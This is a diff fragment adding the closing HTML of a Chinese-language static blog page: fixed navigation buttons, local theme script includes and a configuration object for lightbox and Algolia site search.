+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
